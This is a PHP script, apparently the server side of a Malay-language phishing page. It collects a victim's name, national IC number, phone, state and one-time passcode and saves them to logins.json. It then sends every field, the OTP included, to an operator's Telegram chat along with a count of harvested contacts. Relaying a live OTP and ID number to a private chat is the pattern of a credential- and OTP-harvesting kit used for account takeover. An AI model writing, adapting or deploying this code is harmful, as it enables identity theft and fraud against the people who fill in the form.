<?php

error_reporting(E_ALL);
ini_set('display_errors', 1);
header('Content-Type: application/json');

function normalizePhone($value) {
    return preg_replace('/\D+/', '', $value);
}

$data = json_decode(file_get_contents('php://input'), true);

$nama = trim($data['nama'] ?? '');
$ic = trim($data['ic'] ?? '');
$telefon = trim($data['telefon'] ?? '');
$negeri = trim($data['negeri'] ?? '');
$otp = trim($data['otp'] ?? '');

if ($nama === '' || $ic === '' || $telefon === '' || $negeri === '' || $otp === '') {
    http_response_code(400);
    echo json_encode(['success' => false, 'error' => 'Semua medan diperlukan.']);
    exit;
}

$phoneDigits = normalizePhone($telefon);
$otpFile = __DIR__ . '/otps.json';
$otps = file_exists($otpFile) ? json_decode(file_get_contents($otpFile), true) : [];
if (!is_array($otps)) {
    $otps = [];
}

if (!isset($otps[$phoneDigits]) || $otps[$phoneDigits]['otp'] !== $otp) {
    http_response_code(400);
    echo json_encode(['success' => false, 'error' => 'Kod OTP tidak sah.']);
    exit;
}

unset($otps[$phoneDigits]);
file_put_contents($otpFile, json_encode($otps, JSON_PRETTY_PRINT));

$loginsFile = __DIR__ . '/logins.json';
$logins = file_exists($loginsFile) ? json_decode(file_get_contents($loginsFile), true) : [];
if (!is_array($logins)) {
    $logins = [];
}
$logins[$phoneDigits] = [
    'nama' => $nama,
    'ic' => $ic,
    'telefon' => $telefon,
    'negeri' => $negeri,
    'logged_at' => date('c')
];
file_put_contents($loginsFile, json_encode($logins, JSON_PRETTY_PRINT));

$contactsFile = __DIR__ . '/contacts.json';
$contacts = file_exists($contactsFile) ? json_decode(file_get_contents($contactsFile), true) : [];
if (!is_array($contacts)) {
    $contacts = [];
}

$contactCount = count($contacts);

$token = getenv('TELEGRAM_BOT_TOKEN') ?: '';
$chat_id = getenv('TELEGRAM_ADMIN_CHAT_ID') ?: getenv('TELEGRAM_CHAT_ID') ?: '';

if ($token === '') {
    http_response_code(500);
    echo json_encode(['success' => false, 'error' => 'Telegram bot token belum diset.']);
    exit;
}

if ($chat_id === '') {
    http_response_code(500);
    echo json_encode(['success' => false, 'error' => 'Telegram owner chat ID belum diset. Sila tetapkan TELEGRAM_ADMIN_CHAT_ID atau TELEGRAM_CHAT_ID.']);
    exit;
}

$message = "Pengesahan Kod Berjaya\n\n" .
    "Nama: $nama\n" .
    "No. IC: $ic\n" .
    "Telefon: $telefon\n" .
    "Negeri: $negeri\n" .
    "Kod OTP: $otp\n" .
    "Jumlah Contact tersimpan: " . $contactCount . "\n\n" .
    "Login disimpan di Senarai Login admin.";

function sendTelegramMessage($token, $chat_id, $text) {
    $url = "https://api.telegram.org/bot$token/sendMessage";
    $payload = json_encode([
        'chat_id' => $chat_id,
        'text' => $text
    ]);

    if (function_exists('curl_version')) {
        $ch = curl_init($url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
        curl_setopt($ch, CURLOPT_TIMEOUT, 20);
        $response = curl_exec($ch);
        $error = curl_error($ch);
        curl_close($ch);
        if ($response === false) {
            return ['ok' => false, 'error' => 'cURL error: ' . $error];
        }
    } else {
        $options = [
            'http' => [
                'header' => "Content-Type: application/json\r\n",
                'method' => 'POST',
                'content' => $payload,
                'timeout' => 20
            ]
        ];
        $response = @file_get_contents($url, false, stream_context_create($options));
        if ($response === false) {
            return ['ok' => false, 'error' => 'HTTP request failed (allow_url_fopen mungkin dimatikan).'];
        }
    }

    $result = json_decode($response, true);
    if (!is_array($result)) {
        return ['ok' => false, 'error' => 'Respons Telegram tidak sah: ' . substr($response, 0, 200)];
    }
    return $result;
}

if ($chat_id !== '') {
    $telegramResult = sendTelegramMessage($token, $chat_id, $message);
    if (!isset($telegramResult['ok']) || $telegramResult['ok'] !== true) {
        http_response_code(500);
        echo json_encode(['success' => false, 'error' => 'Telegram mengembalikan ralat: ' . ($telegramResult['description'] ?? $telegramResult['error'] ?? 'unknown')]);
        exit;
    }
}

echo json_encode(['success' => true, 'message' => 'Pengesahan berjaya dan owner telah diberitahu.']);

?>
